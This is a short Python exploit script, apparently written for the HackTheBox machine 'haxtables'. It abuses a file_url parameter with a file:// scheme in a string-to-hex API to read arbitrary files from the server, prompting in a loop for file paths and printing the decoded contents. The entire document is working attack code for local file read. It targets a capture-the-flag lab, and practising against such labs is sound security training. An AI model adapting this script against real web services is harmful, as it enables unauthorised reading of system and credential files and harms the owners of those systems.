import requests
import json

def lfi(fil):
    json_data = {
        'action': 'str2hex',
        'file_url' : f"file://{fil}"

    }
    print(f"[file] =>{fil}\n")

    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php',json=json_data)
    data = json.loads(response.text)
    hex_string = data["data"]
    bytes_object = bytes.fromhex(hex_string)
    string = bytes_object.decode()
    print(string)
    #print("====="*20)
    #print(response.text)


def main():
    while True:
        lf = input("[+]FILE >")
        lfi(lf)

main()
